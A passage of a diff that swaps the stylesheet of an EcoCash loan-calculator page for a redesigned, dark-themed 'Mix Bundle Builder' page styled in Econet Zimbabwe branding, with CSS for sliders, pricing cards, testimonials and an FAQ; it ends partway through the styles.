@@ -1,1221 +1,1225 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <title>EcoCash Flex Loans — Zimbabwe</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&family=DM+Sans:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
-  <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    html { scroll-behavior: smooth; }
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
+<title>EcoCash | Mix Bundle Builder · Econet Zimbabwe</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet"/>
+<style>
+/* ═══════════════════════════════════════════
+   DESIGN TOKENS
+═══════════════════════════════════════════ */
+:root{
+  --blue:       #0033a0;
+  --blue-dark:  #002280;
+  --blue-deep:  #001860;
+  --blue-light: #1a4dbf;
+  --blue-soft:  rgba(0,51,160,0.10);
+  --blue-bdr:   rgba(0,51,160,0.25);
+  --green:      #00b050;
+  --green-dark: #007d38;
+  --gold:       #f59e0b;
+  --page:       #06112a;
+  --surface:    #0c1e3f;
+  --surface2:   #112350;
+  --border:     rgba(255,255,255,0.10);
+  --border2:    rgba(255,255,255,0.20);
+  --text:       #ffffff;
+  --text2:      #c8d8f0;
+  --muted:      #7a99c8;
+  --shadow:     0 4px 24px rgba(0,0,0,0.35);
+  --shadow-b:   0 8px 40px rgba(0,51,160,0.40);
+  --header-h:   72px;
+  --tr:         0.22s ease;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+@media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}*,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important}}
+body{font-family:'Inter',sans-serif;background:var(--page);color:var(--text);line-height:1.6;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+body.splash-lock{overflow:hidden;height:100vh}
+:focus-visible{outline:2px solid var(--green);outline-offset:2px}
 
-    :root {
-      --blue: #0052cc;
-      --blue-mid: #0a66d4;
-      --blue-dark: #003d99;
-      --red: #d92b2b;
-      --red-light: #ffd0d0;
-      --green: #15803d;
-      --green-bg: #dcfce7;
-      --surface: #ffffff;
-      --bg: #f4f7fb;
-      --border: #dde3ed;
-      --muted: #64748b;
-      --text: #0f172a;
-      --blue-tint: #eff5ff;
-      --blue-tint-border: #c7d9f8;
-      --shadow-sm: 0 1px 3px rgba(0,52,153,0.08), 0 1px 2px rgba(0,0,0,0.04);
-      --shadow-md: 0 4px 16px rgba(0,52,153,0.10), 0 2px 6px rgba(0,0,0,0.06);
-      --shadow-lg: 0 12px 40px rgba(0,52,153,0.15), 0 4px 12px rgba(0,0,0,0.08);
-    }
+/* ═══ PAGE BG ═══ */
+.page-bg{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.page-bg::before{content:'';position:absolute;top:-200px;right:-200px;width:700px;height:700px;border-radius:50%;background:radial-gradient(circle,rgba(0,51,160,0.18) 0%,transparent 70%)}
+.page-bg::after{content:'';position:absolute;bottom:-100px;left:-150px;width:500px;height:500px;border-radius:50%;background:radial-gradient(circle,rgba(0,176,80,0.08) 0%,transparent 70%)}
 
-    body {
-      font-family: 'DM Sans', sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      font-size: 16px;
-      line-height: 1.6;
-      overflow-x: hidden;
-    }
+/* ═══ SPLASH ═══ */
+.splash{position:fixed;inset:0;z-index:3000;background:radial-gradient(circle at 50% 30%,var(--blue-deep) 0%,var(--page) 75%);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;transition:opacity .45s ease,visibility .45s ease}
+.splash.hide{opacity:0;visibility:hidden;pointer-events:none}
+.splash-logos{display:flex;align-items:center;gap:16px}
+.splash-logo{display:flex;align-items:center;gap:8px;padding:10px 18px;border-radius:12px;font-weight:800;font-size:1.05rem;letter-spacing:-.3px}
+.splash-logo.econet{background:var(--blue);color:#fff}
+.splash-logo.econet::before{content:'●';color:var(--green);margin-right:2px}
+.splash-logo.ecocash{background:var(--green);color:#012}
+.splash-plus{color:var(--muted);font-size:1.2rem;font-weight:300}
+.splash-spinner{width:34px;height:34px;border-radius:50%;border:3px solid var(--border2);border-top-color:var(--green);animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.splash p{color:var(--text2);font-size:13px;font-weight:600;letter-spacing:.3px}
 
-    a { text-decoration: none; color: inherit; }
-    button, input, select { font: inherit; }
+/* ═══ TICKER ═══ */
+.ticker-wrap{background:#000c23;color:var(--text2);padding:11px 0;overflow:hidden;white-space:nowrap;border-bottom:2px solid var(--green);position:relative;z-index:1}
+.ticker-inner{display:inline-flex;animation:ticker 40s linear infinite}
+.ticker-inner span{margin-right:70px;font-size:12.5px;display:inline-flex;align-items:center;gap:8px;font-weight:600}
+@keyframes ticker{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
 
-    /* ── NAV ── */
-    nav {
-      position: sticky; top: 0; z-index: 100;
-      background: rgba(255,255,255,0.97);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--border);
-      box-shadow: var(--shadow-sm);
-    }
-    .nav-inner {
-      max-width: 1120px; margin: 0 auto;
-      height: 66px; padding: 0 28px;
-      display: flex; align-items: center; justify-content: space-between;
-    }
+/* ═══ HEADER ═══ */
+header{background:rgba(6,17,42,0.97);backdrop-filter:blur(12px);border-bottom:2px solid rgba(0,51,160,0.4);position:sticky;top:0;z-index:1000;box-shadow:0 4px 24px rgba(0,0,0,.5);padding-top:env(safe-area-inset-top)}
+.nav-content{max-width:1400px;margin:0 auto;padding:0 5%;height:var(--header-h);display:flex;align-items:center;justify-content:space-between;gap:14px}
+.logo{display:flex;align-items:center;gap:12px;text-decoration:none;cursor:pointer;flex-shrink:0;min-width:0}
+.logo-icon{width:44px;height:44px;background:linear-gradient(135deg,var(--blue),var(--blue-light));border-radius:12px;display:flex;align-items:center;justify-content:center;box-shadow:var(--shadow-b);flex-shrink:0}
+.logo-icon span{color:white;font-weight:900;font-size:18px;letter-spacing:-1px}
+.logo-name{font-size:1.5rem;font-weight:900;color:var(--text);letter-spacing:-.5px;line-height:1;white-space:nowrap}
+.logo-name em{color:var(--green);font-style:normal}
+.logo-sub{font-size:9px;color:var(--muted);font-weight:700;letter-spacing:2px;text-transform:uppercase;display:block;margin-top:2px;white-space:nowrap}
+.live-pill{background:rgba(0,176,80,0.15);border:1px solid rgba(0,176,80,0.35);color:var(--green);font-size:10.5px;font-weight:700;letter-spacing:1px;padding:5px 13px;border-radius:20px;display:flex;align-items:center;gap:6px;flex-shrink:0}
+.live-dot{width:6px;height:6px;background:var(--green);border-radius:50%;animation:blink 1.4s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.nav-links{display:flex;gap:24px;font-weight:600;font-size:14px}
+.nav-links a{color:var(--text2);text-decoration:none;transition:var(--tr);padding:6px 0;border-bottom:2px solid transparent;cursor:pointer}
+.nav-links a:hover{color:var(--text);border-bottom-color:var(--blue-light)}
+.hamburger{display:none;font-size:1.8rem;color:var(--text);cursor:pointer;background:none;border:none;padding:2px;flex-shrink:0}
 
-    /* LOGO */
-    .logo-wrap { display: flex; align-items: center; gap: 0; line-height: 1; user-select: none; }
-    .logo-eco {
-      font-family: 'Sora', sans-serif;
-      font-size: 22px; font-weight: 800;
-      color: var(--blue);
-      letter-spacing: -0.5px;
-    }
-    .logo-cash {
-      font-family: 'Sora', sans-serif;
-      font-size: 22px; font-weight: 800;
-      color: var(--red);
-      letter-spacing: -0.5px;
-    }
-    .logo-tag {
-      font-family: 'DM Sans', sans-serif;
-      font-size: 9.5px; font-weight: 600;
-      letter-spacing: 0.14em; text-transform: uppercase;
-      color: var(--muted);
-      display: block;
-      margin-top: 2px;
-    }
+/* ═══ HERO ═══ */
+.hero{background:linear-gradient(160deg,var(--blue-deep) 0%,var(--blue) 55%,#004d80 100%);color:white;padding:clamp(64px,13vw,140px) 5% clamp(56px,10vw,100px);text-align:center;position:relative;overflow:hidden;z-index:1}
+.hero::before{content:'';position:absolute;inset:0;background-image:radial-gradient(circle at 70% 30%,rgba(0,176,80,0.12) 0%,transparent 55%);pointer-events:none}
+.hero-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(0,176,80,0.18);border:1px solid rgba(0,176,80,0.40);color:var(--green);font-size:11px;font-weight:700;padding:7px 18px;letter-spacing:2px;text-transform:uppercase;border-radius:999px;margin-bottom:22px}
+.hero h1{font-size:clamp(2.1rem,7.5vw,4.2rem);font-weight:900;margin-bottom:16px;letter-spacing:-1.5px;line-height:1.08}
+.hero h1 em{font-style:normal;color:var(--green)}
+.hero p{font-size:clamp(.95rem,2.4vw,1.15rem);max-width:640px;margin:0 auto 36px;color:rgba(255,255,255,.8);line-height:1.75;padding:0 6px}
+.hero-cta{display:inline-block;background:linear-gradient(135deg,var(--green),var(--green-dark));color:white;padding:17px 56px;border-radius:50px;font-weight:800;text-decoration:none;font-size:1.05rem;letter-spacing:.3px;box-shadow:0 8px 32px rgba(0,176,80,.45);transition:var(--tr);cursor:pointer;border:none;font-family:'Inter',sans-serif}
+.hero-cta:hover{transform:translateY(-3px);box-shadow:0 12px 40px rgba(0,176,80,.5)}
+.hero-stats{display:flex;justify-content:center;gap:10px;flex-wrap:wrap;margin-top:28px}
+.hstat{background:rgba(255,255,255,.10);border:1px solid rgba(255,255,255,.20);border-radius:999px;padding:7px 16px;font-size:12px;font-weight:700;color:white;white-space:nowrap}
 
-    .nav-links { display: flex; gap: 6px; }
-    .nav-links a {
-      font-size: 13.5px; font-weight: 500; color: var(--muted);
-      padding: 7px 13px; border-radius: 8px;
-      transition: background 0.15s, color 0.15s;
-    }
-    .nav-links a:hover { background: var(--blue-tint); color: var(--blue); }
-    .nav-cta {
-      background: var(--blue); color: #fff !important;
-      padding: 8px 18px !important; border-radius: 8px !important;
-      font-weight: 600 !important;
-      transition: background 0.15s !important;
-    }
-    .nav-cta:hover { background: var(--blue-dark) !important; }
+/* ═══ SECTIONS ═══ */
+.section{padding:clamp(56px,9vw,90px) 5%;position:relative;z-index:1}
+.section-label{color:var(--green);font-weight:700;text-align:center;letter-spacing:3px;font-size:.9rem;text-transform:uppercase;display:block;margin-bottom:12px}
+.section-title{text-align:center;font-size:clamp(1.7rem,5.5vw,2.7rem);font-weight:900;margin-bottom:16px;letter-spacing:-.8px;color:var(--text)}
+.section-sub{text-align:center;max-width:800px;margin:0 auto 50px;color:var(--muted);font-size:1rem;line-height:1.75;padding:0 6px}
 
-    .hamburger { display: none; background: none; border: 1px solid var(--border); border-radius: 8px; cursor: pointer; padding: 8px; flex-direction: column; gap: 4px; }
-    .hamburger span { display: block; width: 20px; height: 2px; background: var(--text); border-radius: 2px; transition: 0.2s; }
-    .hamburger.open span:nth-child(1) { transform: translateY(6px) rotate(45deg); }
-    .hamburger.open span:nth-child(2) { opacity: 0; }
-    .hamburger.open span:nth-child(3) { transform: translateY(-6px) rotate(-45deg); }
+/* ═══ SUMMARY CARD ═══ */
+.summary-card{max-width:720px;margin:0 auto 28px;background:var(--surface);border:1px solid var(--border2);border-radius:18px;padding:16px 22px;display:flex;align-items:center;justify-content:space-between;gap:14px;flex-wrap:wrap;box-shadow:var(--shadow)}
+.summary-left{display:flex;align-items:center;gap:12px;min-width:0}
+.summary-period{font-size:11px;font-weight:800;color:var(--green);letter-spacing:1px;text-transform:uppercase}
+.summary-price-label{font-size:11px;color:var(--muted);font-weight:600}
+.summary-price{font-size:1.5rem;font-weight:900;color:var(--text);letter-spacing:-.5px;line-height:1;margin-top:2px}
+.summary-metrics{display:flex;gap:18px;flex-wrap:wrap}
+.summary-metric{text-align:center;min-width:52px}
+.summary-metric .sm-label{font-size:10px;color:var(--muted);font-weight:700;text-transform:uppercase;letter-spacing:.5px}
+.summary-metric .sm-val{font-size:1rem;font-weight:800;color:var(--text);margin-top:2px}
 
-    .mobile-menu {
-      display: none; background: var(--surface);
-      border-bottom: 1px solid var(--border);
-      padding: 8px 20px 12px;
-    }
-    .mobile-menu.open { display: block; }
-    .mobile-menu a {
-      display: block; padding: 12px 4px;
-      font-size: 15px; font-weight: 500; color: var(--text);
-      border-bottom: 1px solid var(--border);
-    }
-    .mobile-menu a:last-child { border-bottom: none; }
+/* ═══ PERIOD TABS ═══ */
+.period-tabs-wrap{margin-bottom:40px;max-width:760px;margin-left:auto;margin-right:auto}
+.period-tabs{display:flex;justify-content:center;gap:8px;flex-wrap:wrap}
+.ptab{padding:10px 22px;border-radius:50px;font-weight:700;font-size:13px;cursor:pointer;border:2px solid var(--border2);background:transparent;color:var(--muted);font-family:'Inter',sans-serif;transition:all var(--tr);letter-spacing:.3px;white-space:nowrap;text-decoration:none}
+.ptab:hover{border-color:var(--blue-light);color:var(--text)}
+.ptab.active{background:linear-gradient(135deg,var(--blue),var(--blue-light));border-color:transparent;color:white;box-shadow:var(--shadow-b)}
+.ptab .ptab-price{font-size:10px;display:block;font-weight:600;margin-top:2px;opacity:.85}
 
-    /* ── HERO ── */
-    .hero {
-      background: linear-gradient(150deg, #0052cc 0%, #003d99 55%, #002680 100%);
-      color: #fff;
-      padding: 72px 24px 90px;
-      text-align: center;
-      position: relative;
-      overflow: hidden;
-    }
-    .hero::before {
-      content: '';
-      position: absolute; inset: 0;
-      background: radial-gradient(ellipse 80% 60% at 50% 120%, rgba(255,255,255,0.06) 0%, transparent 70%);
-      pointer-events: none;
-    }
-    .hero::after {
-      content: '';
-      position: absolute; top: -80px; right: -80px;
-      width: 360px; height: 360px; border-radius: 50%;
-      background: rgba(255,255,255,0.04);
-      pointer-events: none;
-    }
-    .hero-badge {
-      display: inline-flex; align-items: center; gap: 7px;
-      background: rgba(255,255,255,0.12);
-      border: 1px solid rgba(255,255,255,0.22);
-      font-family: 'DM Sans', sans-serif;
-      font-size: 11px; font-weight: 600; letter-spacing: 0.12em; text-transform: uppercase;
-      padding: 6px 16px; border-radius: 100px; margin-bottom: 24px;
-      position: relative; z-index: 1;
-    }
-    .hero-badge .pulse {
-      width: 8px; height: 8px; border-radius: 50%;
-      background: #4ade80;
-      box-shadow: 0 0 0 0 rgba(74,222,128,0.5);
-      animation: pulse 2s infinite;
-    }
-    @keyframes pulse {
-      0% { box-shadow: 0 0 0 0 rgba(74,222,128,0.5); }
-      70% { box-shadow: 0 0 0 8px rgba(74,222,128,0); }
-      100% { box-shadow: 0 0 0 0 rgba(74,222,128,0); }
-    }
-    .hero h1 {
-      font-family: 'Sora', sans-serif;
-      font-size: clamp(30px, 5vw, 54px);
-      font-weight: 800; line-height: 1.08;
-      letter-spacing: -1.5px; margin-bottom: 18px;
-      position: relative; z-index: 1;
-    }
-    .hero h1 .h1-red { color: #fca5a5; }
-    .hero p {
-      font-size: 16px; color: rgba(255,255,255,0.78);
-      max-width: 500px; margin: 0 auto 44px;
-      position: relative; z-index: 1;
-    }
-    .hero-stats {
-      display: flex; justify-content: center; flex-wrap: wrap; gap: 48px;
-      position: relative; z-index: 1;
-    }
-    .hero-stat-val {
-      font-family: 'Sora', sans-serif;
-      font-size: 26px; font-weight: 800; color: #fff;
-      letter-spacing: -0.5px;
-    }
-    .hero-stat-lbl {
-      font-size: 10.5px; font-weight: 600; color: rgba(255,255,255,0.55);
-      text-transform: uppercase; letter-spacing: 0.1em; margin-top: 3px;
-    }
-    .stat-divider { width: 1px; background: rgba(255,255,255,0.15); align-self: stretch; }
+/* ═══ BUNDLE CARDS ═══ */
+.bundles-stack{display:flex;flex-direction:column;gap:32px;max-width:760px;margin:0 auto}
+.bundle-card-main{background:var(--surface);border-radius:24px;border:1px solid var(--border2);overflow:hidden;box-shadow:0 16px 60px rgba(0,0,0,.4);scroll-margin-top:90px}
+.bcard-head{background:linear-gradient(135deg,var(--blue),var(--blue-light));padding:24px 28px;display:flex;align-items:center;justify-content:space-between;gap:14px;flex-wrap:wrap}
+.bcard-head-left h2{font-size:1.5rem;font-weight:900;color:white;margin:0}
+.bcard-head-left p{font-size:12px;color:rgba(255,255,255,.75);margin-top:3px;font-weight:500}
+.bcard-price-wrap{text-align:right}
+.bcard-price-label{font-size:10px;color:rgba(255,255,255,.65);font-weight:600;text-transform:uppercase;letter-spacing:1px;margin-bottom:3px}
+.bcard-price{font-size:2.6rem;font-weight:900;color:white;letter-spacing:-1px;line-height:1}
+.bcard-price span{font-size:1rem;vertical-align:super;font-weight:700;margin-right:2px}
+.best-badge{display:inline-block;background:var(--gold);color:#000;font-size:10px;font-weight:800;padding:3px 10px;border-radius:999px;margin-top:6px;letter-spacing:.5px}
+.bcard-body{padding:28px}
+.slider-section{margin-bottom:28px}
+.slider-section:last-child{margin-bottom:0}
+.slider-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;gap:10px}
+.slider-icon{width:36px;height:36px;background:var(--surface2);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0}
+.slider-info{flex:1;margin:0 14px;min-width:0}
+.slider-info h4{font-size:14px;font-weight:700;color:var(--text);margin-bottom:1px}
+.slider-info p{font-size:11px;color:var(--muted);font-weight:500}
+.slider-val{font-size:1.3rem;font-weight:900;color:var(--text);min-width:72px;text-align:right;letter-spacing:-.5px;flex-shrink:0}
+.slider-val em{font-size:11px;font-weight:600;color:var(--muted);font-style:normal;margin-left:2px}
+input[type=range]{width:100%;-webkit-appearance:none;appearance:none;height:26px;background:transparent;outline:none;cursor:pointer;margin-top:4px}
+input[type=range]::-webkit-slider-runnable-track{height:8px;border-radius:4px;background:linear-gradient(to right,var(--green) 0%,var(--green) var(--pct,100%),var(--surface2) var(--pct,100%),var(--surface2) 100%)}
+input[type=range]::-moz-range-track{height:8px;border-radius:4px;background:linear-gradient(to right,var(--green) 0%,var(--green) var(--pct,100%),var(--surface2) var(--pct,100%),var(--surface2) 100%)}
+input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:26px;height:26px;border-radius:50%;background:#fff;border:3px solid var(--green);box-shadow:0 2px 10px rgba(0,176,80,.45);cursor:grab;margin-top:-9px}
+input[type=range]::-moz-range-thumb{width:26px;height:26px;border-radius:50%;background:#fff;border:3px solid var(--green);box-shadow:0 2px 10px rgba(0,176,80,.45);cursor:grab}
+input[type=range]:active::-webkit-slider-thumb{cursor:grabbing;transform:scale(1.1)}
+.range-minmax{display:flex;justify-content:space-between;font-size:10.5px;color:var(--muted);font-weight:600;margin-top:2px}
+.price-bar{background:var(--surface2);border-top:1px solid var(--border2);padding:20px 28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:14px}
+.price-bar-label{font-size:11px;color:var(--muted);font-weight:600;text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
+.price-bar-val{font-size:2rem;font-weight:900;color:white;letter-spacing:-.8px}
+.price-bar-sub{font-size:11px;color:var(--muted);margin-top:3px}
+.subscribe-btn{background:linear-gradient(135deg,var(--green),var(--green-dark));color:white;border:none;padding:15px 36px;border-radius:50px;font-weight:800;font-size:1rem;cursor:pointer;font-family:'Inter',sans-serif;transition:var(--tr);letter-spacing:.3px;box-shadow:0 4px 18px rgba(0,176,80,.4);min-height:48px}
+.subscribe-btn:hover{transform:translateY(-2px);box-shadow:0 8px 28px rgba(0,176,80,.5)}
+.security-row{display:flex;align-items:center;justify-content:center;gap:16px;padding:14px 28px;background:rgba(0,0,0,.2);border-top:1px solid var(--border);flex-wrap:wrap}
+.sec-badge{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--muted);font-weight:600}
+.sec-dot{width:4px;height:4px;background:var(--blue-light);border-radius:50%;flex-shrink:0}
 
-    /* ── CALCULATOR ── */
-    .calc-section {
-      max-width: 680px; margin: -48px auto 0;
-      padding: 0 20px 80px;
-      position: relative; z-index: 10;
-    }
-    .calc-card {
-      background: var(--surface);
-      border-radius: 20px;
-      border: 1px solid var(--border);
-      box-shadow: var(--shadow-lg);
-      overflow: hidden;
-    }
-    .calc-header {
-      padding: 22px 28px;
-      border-bottom: 1px solid var(--border);
-      display: flex; align-items: center; justify-content: space-between;
-    }
-    .calc-header h2 {
-      font-family: 'Sora', sans-serif;
-      font-size: 17px; font-weight: 700;
-    }
-    .calc-header p { font-size: 12.5px; color: var(--muted); margin-top: 2px; }
-    .rate-pill {
-      background: var(--blue-tint); border: 1px solid var(--blue-tint-border);
-      color: var(--blue); font-size: 12px; font-weight: 700;
-      padding: 5px 12px; border-radius: 100px; white-space: nowrap;
-    }
+/* ═══ STATS STRIP ═══ */
+.stats-strip{background:linear-gradient(135deg,var(--blue-deep),var(--blue));padding:0;position:relative;z-index:1}
+.stats-grid{max-width:1400px;margin:0 auto;padding:0 5%;display:grid;grid-template-columns:repeat(4,1fr)}
+.stat-item{padding:28px 16px;text-align:center;border-right:1px solid rgba(255,255,255,.12)}
+.stat-item:last-child{border-right:none}
+.stat-val{font-size:clamp(1.6rem,5vw,2.4rem);font-weight:900;color:white;letter-spacing:-1px;line-height:1}
+.stat-val.green{color:var(--green)}
+.stat-label{font-size:11px;color:rgba(255,255,255,.6);font-weight:600;margin-top:6px;letter-spacing:.5px;text-transform:uppercase}
 
-    .calc-body { padding: 28px; }
-    .field { margin-bottom: 26px; }
-    .field-label {
-      display: flex; align-items: center; justify-content: space-between;
-      font-size: 11px; font-weight: 700; text-transform: uppercase;
-      letter-spacing: 0.12em; color: var(--muted); margin-bottom: 10px;
-    }
-    .amount-display {
-      font-family: 'Sora', sans-serif;
-      font-size: 40px; font-weight: 800; color: var(--blue);
-      margin-bottom: 14px; letter-spacing: -2px;
-      line-height: 1;
-    }
-    .amount-display .cur {
-      font-size: 20px; font-weight: 600; color: var(--muted);
-      margin-right: 4px; letter-spacing: 0;
-    }
+/* ═══ BENEFITS ═══ */
+.benefits-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px;max-width:1200px;margin:0 auto}
+.benefit-card{background:var(--surface);padding:28px 22px;border-radius:18px;border:1px solid var(--border);transition:all var(--tr)}
+.benefit-card:hover{border-color:var(--blue-light);transform:translateY(-4px);box-shadow:var(--shadow)}
+.benefit-icon{width:50px;height:50px;background:linear-gradient(135deg,var(--blue-soft),rgba(0,176,80,.1));border:1px solid var(--blue-bdr);border-radius:13px;display:flex;align-items:center;justify-content:center;font-size:1.5rem;margin-bottom:16px}
+.benefit-card h3{font-size:1rem;font-weight:800;color:var(--text);margin-bottom:7px}
+.benefit-card p{font-size:13px;color:var(--muted);line-height:1.65}
 
-    /* Range slider */
-    .slider-track { position: relative; margin-bottom: 8px; }
-    input[type=range] {
-      width: 100%; height: 6px;
-      -webkit-appearance: none; appearance: none;
-      background: var(--border); border-radius: 3px; outline: none; cursor: pointer;
-    }
-    input[type=range]::-webkit-slider-thumb {
-      -webkit-appearance: none; appearance: none;
-      width: 24px; height: 24px; border-radius: 50%;
-      background: var(--blue); border: 3px solid #fff;
-      box-shadow: 0 0 0 2px var(--blue), 0 2px 8px rgba(0,82,204,0.3);
-      cursor: pointer; transition: box-shadow 0.2s;
-    }
-    input[type=range]::-webkit-slider-thumb:hover {
-      box-shadow: 0 0 0 3px rgba(0,82,204,0.2), 0 2px 8px rgba(0,82,204,0.4);
-    }
-    input[type=range]::-moz-range-thumb {
-      width: 24px; height: 24px; border-radius: 50%;
-      background: var(--blue); border: 3px solid #fff;
-      box-shadow: 0 0 0 2px var(--blue); cursor: pointer;
-    }
-    .range-labels {
-      display: flex; justify-content: space-between;
-      font-size: 11.5px; color: var(--muted); font-weight: 500;
-    }
+/* ═══ HOW IT WORKS ═══ */
+.steps-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;max-width:1100px;margin:0 auto}
+.step-card{background:var(--surface);padding:28px 22px;border-radius:18px;border:1px solid var(--border);text-align:center;transition:all var(--tr)}
+.step-card:hover{border-color:var(--blue-light);transform:translateY(-4px)}
+.step-num{width:50px;height:50px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.2rem;font-weight:900;color:white;margin:0 auto 16px;box-shadow:var(--shadow-b)}
+.step-card h3{font-size:1rem;font-weight:800;color:var(--text);margin-bottom:7px}
+.step-card p{font-size:13px;color:var(--muted);line-height:1.65}
+.step-icon-badge{font-size:1.4rem;display:block;margin-bottom:6px}
+@media(min-width:900px){.steps-grid{grid-template-columns:repeat(5,1fr)}}
 
-    /* Term buttons */
-    .term-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 8px; }
-    .term-btn {
-      border: 1.5px solid var(--border);
-      background: var(--bg); color: var(--muted);
-      border-radius: 10px; padding: 10px 4px;
-      font-size: 12.5px; font-weight: 600;
-      cursor: pointer; transition: all 0.15s;
-      text-align: center;
-    }
-    .term-btn:hover { border-color: var(--blue); color: var(--blue); background: var(--blue-tint); }
-    .term-btn.active {
-      background: var(--blue); color: #fff;
-      border-color: var(--blue);
-      box-shadow: 0 2px 8px rgba(0,82,204,0.35);
-    }
+/* ═══ TESTIMONIALS ═══ */
+.testimonials-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:16px;max-width:1200px;margin:0 auto}
+.testimonial-card{background:var(--surface);padding:24px 20px;border-radius:16px;border:1px solid var(--border);transition:all var(--tr)}
+.testimonial-card:hover{transform:translateY(-5px);border-color:var(--blue-light);box-shadow:var(--shadow)}
+.t-stars{color:var(--gold);font-size:13px;letter-spacing:2px;margin-bottom:10px}
+.t-text{font-size:13px;color:var(--text2);line-height:1.75;font-style:italic;margin-bottom:14px}
+.t-author{font-size:12px;font-weight:700;color:var(--muted)}
 
-    /* Result banner */
-    .result-banner {
-      background: var(--blue-tint);
-      border: 1px solid var(--blue-tint-border);
-      border-radius: 14px; padding: 18px 22px;
-      display: grid; grid-template-columns: 1fr 1fr 1fr;
-      gap: 16px; margin: 22px 0 16px;
-    }
-    .result-item .rl {
-      font-size: 10.5px; font-weight: 700;
-      text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted);
-    }
-    .result-item .rv {
-      font-family: 'Sora', sans-serif;
-      font-size: 20px; font-weight: 800; margin-top: 4px; color: var(--text);
-      letter-spacing: -0.5px;
-    }
-    .rv.green { color: var(--green); }
-    .rv.blue { color: var(--blue); }
+/* ═══ FAQ ═══ */
+.faq-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px;max-width:1000px;margin:0 auto}
+.faq-card{background:var(--surface);border:1px solid var(--border);border-radius:14px;overflow:hidden;border-left:4px solid transparent;transition:border-color var(--tr)}
+.faq-card.open{border-left-color:var(--blue-light)}
+.faq-question{width:100%;text-align:left;background:none;border:none;font-size:13.5px;font-weight:700;padding:17px 20px;cursor:pointer;display:flex;justify-content:space-between;align-items:center;color:var(--text);font-family:'Inter',sans-serif;gap:12px}
+.faq-icon{width:26px;height:26px;background:var(--surface2);border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0;color:var(--blue-light);font-size:14px;font-weight:900;transition:all var(--tr)}
+.faq-card.open .faq-icon{background:var(--blue-light);color:white;transform:rotate(45deg)}
+.faq-answer{max-height:0;overflow:hidden;transition:max-height .3s ease}
+.faq-card.open .faq-answer{max-height:200px}
+.faq-ans-text{padding:4px 20px 16px;font-size:13px;color:var(--muted);line-height:1.75}
 
-    .calc-note {
-      font-size: 12px; color: var(--muted); margin-bottom: 20px;
-      display: flex; align-items: center; gap: 6px;
-    }
-    .calc-note::before {
-      content: 'ℹ';
-      width: 16px; height: 16px; border-radius: 50%;
-      background: var(--blue-tint); color: var(--blue);
-      font-size: 10px; display: flex; align-items: center; justify-content: center;
-      flex-shrink: 0;
-    }
+/* ═══ CTA BANNER ═══ */
+.cta-banner{background:linear-gradient(135deg,var(--blue-deep),var(--blue));padding:clamp(48px,9vw,72px) 5%;text-align:center;position:relative;z-index:1;overflow:hidden}
+.cta-banner::before{content:'';position:absolute;top:-60px;right:-60px;width:380px;height:380px;background:radial-gradient(circle,rgba(0,176,80,.15) 0%,transparent 70%)}
+.cta-banner h2{font-size:clamp(1.6rem,5.5vw,2.8rem);font-weight:900;color:white;margin-bottom:12px;letter-spacing:-.8px;position:relative;z-index:1}
+.cta-banner p{color:rgba(255,255,255,.7);font-size:1.05rem;margin-bottom:28px;position:relative;z-index:1}
 
-    .apply-btn {
-      width: 100%;
-      background: linear-gradient(135deg, var(--blue-mid) 0%, var(--blue-dark) 100%);
-      color: #fff; border: none; border-radius: 12px;
-      padding: 17px 24px;
-      font-family: 'Sora', sans-serif;
-      font-size: 15px; font-weight: 700;
-      cursor: pointer; letter-spacing: 0.02em;
-      box-shadow: 0 4px 16px rgba(0,82,204,0.35);
-      transition: all 0.2s;
-    }
-    .apply-btn:hover {
-      background: linear-gradient(135deg, var(--blue-dark) 0%, #001f6e 100%);
-      transform: translateY(-2px);
-      box-shadow: 0 8px 24px rgba(0,82,204,0.45);
-    }
-    .apply-btn:active { transform: translateY(0); }
+/* ═══ FOOTER ═══ */
+footer{background:#040d1e;padding:64px 5% 32px;color:var(--muted);position:relative;z-index:1}
+.footer-inner{max-width:1400px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:40px}
+.footer-brand p{font-size:13px;color:var(--muted);line-height:1.75;max-width:230px}
+.footer-divider{width:32px;height:2px;background:var(--green);margin:14px 0}
